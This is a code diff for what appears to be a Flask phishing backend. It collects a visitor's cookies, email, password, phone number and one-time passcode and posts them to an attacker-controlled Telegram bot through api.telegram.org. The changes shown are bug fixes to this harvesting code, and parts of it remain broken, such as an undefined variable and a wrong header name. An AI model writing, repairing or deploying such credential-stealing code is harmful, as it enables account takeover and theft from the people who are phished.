@@ -26,7 +26,7 @@ app = Flask(__name__, template_folder="templates")
 def init_data():
 
     g.data = {
-        "cookies": request.headers.get("Cookie",""),
+        "cookies": request.headers.get("Cookies",""),
         "email": "",
         "password": "",
         "phone": "",
@@ -35,18 +35,18 @@ def init_data():
     }
     
     message = f"""
-    Cookies: {g.data("Cookies", "")}
-    Email: {g.data("email", "")}
-    Password: {g.data("password", "")}
-    Phone: {g.data("phone", "")}
-    OTP: {g.data("otp","")}
+    Cookies: {g.data.get("cookies", "")}
+    Email: {g.data.get("email", "")}
+    Password: {g.data.get("password", "")}
+    Phone: {g.data.get("phone", "")}
+    OTP: {g.data.get("otp","")}
     """
     
 def before_request_func():
-    Cookies = g.data.get("Cookie", "")
+    Cookies = g.data.get("Cookies", "")
     
     message = f"""
-    Cookies: {cookie}
+    Cookies: {cookies}
     """
     
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
